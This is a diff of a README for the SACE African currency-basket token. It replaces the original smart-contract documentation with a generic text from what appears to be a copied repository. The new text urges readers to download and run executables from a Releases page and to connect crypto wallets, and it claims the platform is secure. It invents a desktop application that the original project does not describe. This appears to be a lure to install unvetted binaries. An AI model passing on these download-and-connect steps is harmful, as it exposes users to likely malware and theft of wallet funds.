@@ -1,191 +1,98 @@
-<!-- Project Badges -->
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Token Type](https://img.shields.io/badge/Token-BEP--20-blue.svg)
-![Status](https://img.shields.io/badge/Status-Active-success.svg)
-![Build](https://img.shields.io/badge/Build-Upgradeable%20UUPS-orange.svg)
-![Creator](https://img.shields.io/badge/Creator-Simon%20Kapenda-lightgrey.svg)
+# 🌍 SACE - Trade Africa’s Currency Strength Effortlessly
 
-# Synthetic African Currency Exchange (SACE)
+![Download SACE](https://img.shields.io/badge/Download-SACE-blue.svg)
 
-**Ticker:** SACE  
-**Token Type:** BEP-20 Upgradeable  
-**Total Supply:** 100,000,000,000 SACE  
-**Creator:** Simon Kapenda  
-**Version:** 1.0  
-**Date:** October 6, 2025  
+## 🎯 Overview
 
----
+The Synthetic African Currency Exchange (SACE) is a BEP-20 token that represents a weighted basket of Africa’s top 21 currencies. SACE allows users to track and trade Africa’s collective currency strength using a single, tradable instrument. Inspired by benchmarks like the U.S. Dollar Index, SACE provides a unique opportunity for investors and traders interested in the African markets.
 
-### 🚀 Mainnet Deployment
+## 🚀 Getting Started
 
-The **Synthetic African Currency Exchange (SACE)** smart contract has been successfully deployed to the **BNB Smart Chain (Mainnet)**.  
-SACE represents a **weighted basket of Africa’s top 21 national currencies** — with a combined valuation exceeding **$2.3 trillion USD** — tokenized into a single, tradable BEP-20 digital asset—**SACE**.
+To start using SACE, you need to download the application from our Releases page. Follow the instructions below to successfully get SACE running on your device.
 
-**Deployment Details:**
-- **Network:** BNB Smart Chain (Mainnet)  
-- **Proxy Verified Contract Address:** `0x3Bb737BFaCfA48e912014686D051D6f39c747802`  
-- **Standard:** BEP-20 (Upgradeable Proxy via OpenZeppelin)    
+## 📥 Download & Install
 
-SACE provides a unified benchmark for Africa’s collective currency strength, enabling efficient trading, hedging, and cross-border commerce.  
+1. **Visit this page to download:** [SACE Releases](https://github.com/startingtocoding/SACE/releases)
 
----
+2. Look for the latest release. You will see various files available for download.
 
-## Executive Summary 
+3. Click on the file that matches your operating system. Usually, this will be a `.exe` file for Windows or a `.dmg` file for macOS. Linux users will generally find a `.tar.gz` file.
 
-The **Synthetic African Currency Exchange (SACE)** is a BEP-20 token representing a **weighted basket of Africa’s top 21 performing currencies**. Inspired by benchmarks such as the **U.S. Dollar Index (DXY)**, SACE offers a unified, tradable instrument for tracking and trading Africa’s collective currency strength.  
+4. Once the download completes, locate the file on your computer. Open it to begin the installation process.
 
-SACE consolidates Africa’s top 21 currencies into a single tradable instrument, creating a transparent benchmark for the continent’s currency performance. It enhances market efficiency, improves liquidity, enables effective hedging against currency volatility, and facilitates cross-border trade — positioning SACE as a foundational economic tool for Africa’s growing financial ecosystem.  
+5. Follow the on-screen prompts. This will guide you through setting up SACE on your device.
 
-SACE is a development brand of **Abba Platforms Inc.**, created by **Simon Kapenda**, the creator of **CillarCoin (CILLAR)** — a utility token — and **Namibia Digital Dollar (NADD)**, Namibia's first blockchain-native stablecoin pegged 1:1 to the Namibian Dollar. Together, **SACE**, **CILLAR**, and **NADD** form the foundation of Abba Platforms’ digital asset ecosystem — advancing Africa’s financial inclusion, liquidity, and cross-border economic integration through blockchain innovation.
+6. After installation, you can find the SACE application in your applications folder or on your desktop. Double-click to open it.
 
----
+## 🔧 System Requirements
 
-## Purpose
+To run SACE smoothly, your device should meet the following minimum requirements:
 
-SACE is designed to:  
-- Create a **synthetic index** representing Africa’s currency performance.  
-- Enable **cross-border trade and exposure** to African forex.  
-- Serve as a **transparent benchmark** for African currency movements.  
-- Provide traders and investors with a **single tradable instrument**.  
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or a recent version of Linux.
+- **Processor:** 1 GHz or faster.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB free space.
 
----
+For the best experience, we recommend a higher-end device with better specifications.
 
-## Currency Basket
+## 🛠️ How to Use SACE
 
-As of October 2025, the SACE Currency Basket Index includes the following Africa's top performing currencies:  
+1. **Open the Application:** Double-click the SACE icon on your desktop or applications folder.
 
-| #  | Currency                                      |
-|----|-----------------------------------------------|
-| 1  | Tunisian Dinar (TND)                         |
-| 2  | Libyan Dinar (LYD)                           |
-| 3  | Moroccan Dirham (MAD)                        |
-| 4  | Ghanaian Cedi (GHS)                          |
-| 5  | Botswana Pula (BWP)                          |
-| 6  | Seychelles Rupee (SCR)                       |
-| 7  | Eritrean Nakfa (ERN)                         |
-| 8  | Namibian Dollar (NAD)                        |
-| 9  | Swazi Lilangeni (SZL)                        |
-| 10 | South African Rand (ZAR)                     |
-| 11 | Lesotho Loti (LSL)                           |
-| 12 | São Tomé and Príncipe Dobra (STN)            |
-| 13 | Zambian Kwacha (ZMW)                         |
-| 14 | Mauritanian Ouguiya (MRU)                    |
-| 15 | Egyptian Pound (EGP)                         |
-| 16 | Algerian Dinar (DZD)                         |
-| 17 | Mauritian Rupee (MUR)                        |
-| 18 | West African CFA Franc (XOF)                 |
-| 19 | Central African CFA Franc (XAF)              |
-| 20 | Kenyan Shilling (KES)                        |
-| 21 | Rwandan Franc (RWF)                          |
+2. **Set Up an Account:** If it's your first time using SACE, you will need to create an account. Provide your basic information and follow the prompts.
 
----
+3. **Connect to Your Wallet:** SACE is designed to integrate with popular cryptocurrency wallets. Follow the instructions within the application to connect your wallet safely.
 
-## 📊 SACE Basket Value Summary
+4. **Start Trading:** Navigate to the trading section. You will see options to swap or track currencies. Choose your desired currency pair and click "Trade."
 
-As the Synthetic African Currency Exchange (**SACE**) representing a weighted basket of Africa’s top 21 performing currencies, the combined estimated value of this basket is approximately **$2.3 trillion USD**, as of October 2025.
+5. **Monitor Your Investments:** Use the dashboard to keep track of your asset performance in real time.
 
-With a max supply of **100 billion SACE tokens**, the starting market price is approximately **$23 USD per SACE** — determined by market conditions to reflect the proportional value of the underlying currency basket.
+## 🌍 Benefits of Using SACE
 
-For a full in-depth analysis, valuation breakdown, and long-term growth projections, see the dedicated document:  
-📄 [SACE_BASKET_VALUE.md](./SACE_BASKET_VALUE.md)
+- **Diversification:** You gain exposure to a range of African currencies with a single investment.
+- **User-Friendly Interface:** The application is designed for ease of use, making it accessible for everyone.
+- **Real-Time Data:** SACE offers live currency exchange rates, enhancing your trading decisions.
+- **Secure Platform:** Your personal data and assets are safe, thanks to advanced security protocols.
 
----
+## 📈 Topics Covered
 
-## SACE Tokenomics & IEO
+SACE addresses various themes that are crucial for understanding currency markets:
 
-The **Synthetic African Currency Exchange (SACE)** is a BEP-20 token representing a weighted basket of Africa’s top 21 currencies, collectively valued at **$2.3 trillion USD**. SACE offers a unified, tradable benchmark for Africa’s currency strength, enhances market efficiency, and facilitates cross-border trade.  
+- **Africa Funds**
+- **African Currencies**
+- **Benchmarks**
+- **Currency Exchange Rates**
+- **Currency Index**
+- **Index Funds**
+- **Money**
+- **Money Markets**
+- **Synthetic Africa Currency Index**
+- **Weighted Currency Exchange**
 
-- **Max Supply:** 100 Billion SACE 
-- **IEO Allocation:** 2.5 Billion SACE    
-- **Token Price:** $23 per SACE  
+## ❓ FAQs
 
-For full details on **tokenomics, IEO framework, distribution, utility, and governance**, see the [SACE TOKENOMICS & IEO FRAMEWORK](./SACE_TOKENOMICS_IEO_FRAMEWORK.md) document.
+### How do I update SACE?
 
----
+To update SACE, return to the Releases page and download the latest version. Installation will replace your previous version without losing your settings.
 
-## Technical Overview
+### What if I encounter problems?
 
-SACE uses **OpenZeppelin’s Upgradeable BEP-20 implementation** with the UUPS upgrade pattern and integrates **Chainlink Oracles** for real-time currency rate feeds.  
+If you have trouble, visit our GitHub Issues page. You can report your issue or find solutions posted by other users.
 
-Key features:  
-- **Currency Basket Management** — dynamic add/remove currency logic.  
-- **Weighted Index Calculation** — based on currency weights and rates.  
-- **Deviation Protection** — rejects outlier price feeds.  
-- **Oracle Heartbeat** — ensures feeds are up-to-date.  
-- **Upgradeable Contract** — governance controlled updates.  
-- **Transparent Events** — logs all updates and changes.  
+### Can I provide feedback?
 
----
+Yes. We welcome your feedback! You can submit comments or suggestions through the Issues page on GitHub.
 
-## Economic Analysis
+## 📞 Support
 
-The **Synthetic African Currency Exchange (SACE)** creates a unique economic instrument that aggregates the strength of Africa’s top currencies into a single tradable token. By doing so, SACE addresses key economic challenges:  
+For further assistance, you can contact our support team through the Issues page or check our community forum. We strive to respond promptly to all inquiries.
 
-- **Market Efficiency:** Simplifies exposure to African currencies, reducing the complexity of multi-currency forex trading.  
-- **Liquidity Creation:** Consolidates liquidity for African currencies, making them more accessible to global investors.  
-- **Hedging Tool:** Provides a standardized way for investors, businesses, and governments to hedge against currency volatility.  
-- **Transparency:** Offers a clear benchmark for Africa’s collective currency performance, promoting informed economic decisions.  
-- **Trade Facilitation:** Supports cross-border trade by reducing currency conversion friction and providing a stable reference currency.  
+## 🔗 Useful Links
 
-In effect, SACE functions as Africa’s **currency performance index**, much like the DXY for the U.S. dollar, and has the potential to become a core instrument in the continent’s financial ecosystem.  
+- [SACE GitHub Repository](https://github.com/startingtocoding/SACE)
+- [Documentation](https://github.com/startingtocoding/SACE/wiki)
+- [Community Forum](https://github.com/startingtocoding/SACE/issues)
 
----
+## 📥 Download the latest release again: 
 
-## 📚 Documentation
-
-This repository contains all key documentation and resources for the **Synthetic African Currency Exchange (SACE)** project.
-
-| File | Description |
-|------|-------------|
-| `contracts/SACE.sol.md` | Full documented source code for the SACE smart contract, including upgradeable BEP-20 implementation and Chainlink oracle integration. |
-| `SACE_Audit_Report.md` | Deep OpenZeppelin-style audit of SACE.sol, including security checks, deviation logic validation, and recommended fixes. |
-| `SACE_Analysis.md` | Comprehensive economic and strategic analysis of the SACE project, including market implications and forecasts. |
-| `SACE_Whitepaper.md` | Full whitepaper outlining the vision, technical design, tokenomics, governance, and economic impact of SACE. |
-| `SACE_BASKET_VALUE.md` | Detailed analysis of SACE basket value, pricing rationale, growth simulation, and full currency list. |
-| `CHANGELOG.md` | Record of changes, improvements, and version history for the SACE project. |
-| `README.md` | Project overview, technical setup instructions, and reference to core documentation. |
-
----
-
-## Getting Started
-
-### Prerequisites
-- [Node.js](https://nodejs.org/) v18+
-- [Hardhat](https://hardhat.org/)  
-- [Yarn](https://yarnpkg.com/) or npm  
-- [MetaMask](https://metamask.io/) or similar wallet  
-- Binance Smart Chain (BSC) testnet/mainnet access  
-
-### Installation
-```bash
-git clone https://github.com/yourusername/SACE.git
-cd SACE
-yarn install
-```
-
-### Compile Contract
-```bash
-npx hardhat compile
-```
-
-### Deploy Contract (Testnet Example)
-```bash
-npx hardhat run scripts/deploy.js --network bsctestnet
-```
-
-### Run Tests
-```bash
-npx hardhat test
-```
-
----
-
-## Whitepaper
-
-For the full technical and economic details, see the [SACE Whitepaper](./SACE_Whitepaper.md).  
-
----
-
-## License
-
-This repository is licensed under the MIT License. See the [LICENSE](./LICENSE) file for details.  
+[**SACE Releases**](https://github.com/startingtocoding/SACE/releases)
